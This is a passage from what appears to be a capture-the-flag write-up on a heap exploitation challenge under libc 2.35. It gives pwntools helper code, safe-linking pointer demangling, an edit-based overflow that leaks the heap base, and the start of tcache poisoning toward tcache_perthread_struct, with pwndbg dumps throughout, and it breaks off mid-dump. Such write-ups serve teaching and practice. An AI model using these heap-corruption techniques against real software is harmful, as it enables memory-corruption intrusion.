+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mangle</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">val</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">contents</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">new_name</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">new_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">contents</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;contents:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">1&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">key</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p64</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>demangle</code> and <code>mangle</code> is needed because <code>libc-2.35</code> have extra protection where they sort of encrypt the freelist pointer. But as long as we got the heap leak, it&rsquo;s easy to get the real address.</p>
+<p>Now that we have defined our helpers, let&rsquo;s kickstart our initial setup first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">Initial Setup
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># The only purpose for this chunk is we need the size to be used</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># during the edit bug. Set the key to `\x01`</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x01</span><span class="p">),</span> <span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1"># Let&#39;s call this `helper_chunk_a`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># We will use this chunk a lot later</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x32</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># Let&#39;s call this `main_chunk`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># This chunk will be used as our main target to be poisoned</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># Let&#39;s call this `poisoned_chunk`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># This chunk will be used as a helper during poisoning our `poisoned_chunk`</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x34</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;d&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># Let&#39;s call this `helper_chunk_b`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># These allocations purposes are for heap chunks alignment later.</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x35</span><span class="p">),</span> <span class="mh">0x8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;e&#39;</span><span class="o">*</span><span class="mh">0x8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x36</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">))</span> <span class="c1"># Need this to align the chunks later after forgery</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x37</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;d&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x38</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;e&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># Just to be safe to prevent consolidation (heap chunk got merged during free)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After executing the above LOCs, below is the heap layout</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/80gx 0x561b6d1f3290
+</span></span><span class="line"><span class="cl">0x561b6d1f3290:	0x0000000000000000	0x0000000000000071 &lt;- helper_chunk_a
+</span></span><span class="line"><span class="cl">0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3300:	0x6161616161616161	0x0000000000000031 &lt;- main_chunk
+</span></span><span class="line"><span class="cl">0x561b6d1f3310:	0x0000000000000032	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3330:	0x0000000000000000	0x0000000000000031 &lt;- poisoned_chunk
+</span></span><span class="line"><span class="cl">0x561b6d1f3340:	0x0000000000000033	0x6363636363636363
+</span></span><span class="line"><span class="cl">0x561b6d1f3350:	0x6363636363636363	0x6363636363636363
+</span></span><span class="line"><span class="cl">0x561b6d1f3360:	0x0000000000000000	0x0000000000000031 &lt;- helper_chunk_b
+</span></span><span class="line"><span class="cl">0x561b6d1f3370:	0x0000000000000034	0x6464646464646464
+</span></span><span class="line"><span class="cl">0x561b6d1f3380:	0x6464646464646464	0x6464646464646464
+</span></span><span class="line"><span class="cl">0x561b6d1f3390:	0x0000000000000000	0x0000000000000021 &lt;- For alignment purposes during freeing fake chunk
+</span></span><span class="line"><span class="cl">0x561b6d1f33a0:	0x0000000000000035	0x6565656565656565
+</span></span><span class="line"><span class="cl">0x561b6d1f33b0:	0x0000000000000000	0x0000000000000031 &lt;- For alignment purposes during freeing fake chunk
+</span></span><span class="line"><span class="cl">0x561b6d1f33c0:	0x0000000000000036	0x6363636363636363
+</span></span><span class="line"><span class="cl">0x561b6d1f33d0:	0x0000000000000000	0x0000000000000041 &lt;- If we forge poisoned_chunk size to 0xa0 later, this position is the address of poisoned_chunk+0xa0. So, the contents in this address should be a valid heap chunk metadata. I set it to 0x41.
+</span></span><span class="line"><span class="cl">0x561b6d1f33e0:	0x0000000000000000	0x0000000000000031 &lt;- For alignment purposes during freeing 
+</span></span><span class="line"><span class="cl">0x561b6d1f33f0:	0x0000000000000037	0x6464646464646464
+</span></span><span class="line"><span class="cl">0x561b6d1f3400:	0x6464646464646464	0x6464646464646464
+</span></span><span class="line"><span class="cl">0x561b6d1f3410:	0x0000000000000000	0x0000000000000031 &lt;- Just to be safe to prevent consolidation
+</span></span><span class="line"><span class="cl">0x561b6d1f3420:	0x0000000000000038	0x6565656565656565
+</span></span><span class="line"><span class="cl">0x561b6d1f3430:	0x6565656565656565	0x6565656565656565
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, let&rsquo;s free the <code>helper_chunk_b</code> and <code>poisoned_chunk</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Let&#39;s start by freeing our helper_chunk_b continue with poisoned_chunk</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x34</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Now, poisoned_chunk contain a mangled heap pointer to the helper_chunk_b address</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/80gx 0x561b6d1f3290
+</span></span><span class="line"><span class="cl">0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
+</span></span><span class="line"><span class="cl">0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f3310:	0x0000000000000032	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3330:	0x0000000000000000	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f3340:	0x0000561e0ca9e283	0x370a42ea29d203d9
+</span></span><span class="line"><span class="cl">0x561b6d1f3350:	0x6363636363636363	0x6363636363636363
+</span></span><span class="line"><span class="cl">0x561b6d1f3360:	0x0000000000000000	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f3370:	0x0000000561b6d1f3	0x370a42ea29d203d9
+</span></span><span class="line"><span class="cl">0x561b6d1f3380:	0x6464646464646464	0x6464646464646464
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; bins
+</span></span><span class="line"><span class="cl">tcachebins
+</span></span><span class="line"><span class="cl">0x30 [  2]: 0x561b6d1f3340 —▸ 0x561b6d1f3370 ◂— 0x0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see, <code>poisoned_chunk</code> now contains a mangled heap pointer to the helper_chunk_b address. Now, with the <code>edit</code> bug, let&rsquo;s trigger an overflow in the <code>main_chunk</code>, so that we can write its contents until it reach the <code>poisoned_chunk</code> value. Don&rsquo;t forget to set the new_key so that the copied hash value will be equals to <code>0x1</code>, so that the size that is being used is <code>0x60</code> (which is the size of our first hashmap entry).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Leak heap address by overflowing the `main_chunk` via edit feature.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Overflow it until just before the mangled heap pointer location.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x28</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Set new key to `\x01\x00\x01`</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Due to the edit bug, when fetching the size for the rune contents, it will</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># used size of entry with hash `\x01`, which is helper_chunk_a size (0x60)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x32</span><span class="p">),</span> <span class="n">key</span><span class="p">(</span><span class="mh">0x10001</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/80gx 0x561b6d1f3290
+</span></span><span class="line"><span class="cl">0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
+</span></span><span class="line"><span class="cl">0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f3310:	0x0000000000000001	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3330:	0x6262626262626262	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3340:	0x0000561e0ca9e283	0x370a42ea29d203d9
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see, we have successfully overflow the <code>main_chunk</code>. If we call <code>show</code> to the <code>main_chunk</code>, it will also print the contents of <code>poisoned_chunk</code>, which is <code>mangled</code> heap pointer to <code>helper_chunk_b</code> address.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Show the content, and last 6 bytes will be the mangled heap pointer of helper_chunk_b address</span>
+</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x10001</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_heap_addr</span> <span class="o">=</span> <span class="n">demangle</span><span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">leaked_heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;heap_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] heap_base: 0x561b6d1f3000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that we&rsquo;ve got the heap base address, let&rsquo;s move to the next step</p>
+<h4 id="leak-libc-address">Leak libc address</h4>
+<p>In order to get a libc leak, we need to free a chunk to the unsorted bin. However, notice that the max size that we can allocate is only <code>0x60</code>, which mean even though we fulfill the <code>tcache</code> bins, the chunk will be placed to <code>fastbin</code> instead of <code>unsorted_bin</code> when the <code>tcache</code> is full.</p>
+<p>So, I decided to use the same approach as what I did in the <code>math door</code> challenge, which is trying to fulfill the <code>tcache[0xa0]</code> bins to <code>7</code> via <code>tcache</code> poisoning, where I:</p>
+<ul>
+<li>Allocate a chunk to the <code>tcache_perthread_struct.counts</code> (which resides in the heap base)</li>
+<li>Set the <code>counts[(0xa0-0x20) // 16]</code> to 7.</li>
+<li>Forge a chunk <code>size</code> metadata to <code>0xa0</code>.</li>
+<li>Free it, and now the chunk contains a libc address.</li>
+</ul>
+<p>Let&rsquo;s do that.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Poison poisoned_chunk tcache pointer to point</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># to tcache_perthread_struct (heap_base+0x10)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tcache_struct_addr</span> <span class="o">=</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_metadata</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">heap_base</span><span class="p">,</span> <span class="n">tcache_struct_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x10001</span><span class="p">),</span> <span class="n">key</span><span class="p">(</span><span class="mh">0x20001</span><span class="p">),</span> <span class="n">fake_metadata</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Now, poisoned_chunk tcache pointer will point to</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># tcache_perthread_struct instead of helper_chunk_b.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/80gx 0x561b6d1f3290
+</span></span><span class="line"><span class="cl">0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
+</span></span><span class="line"><span class="cl">0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
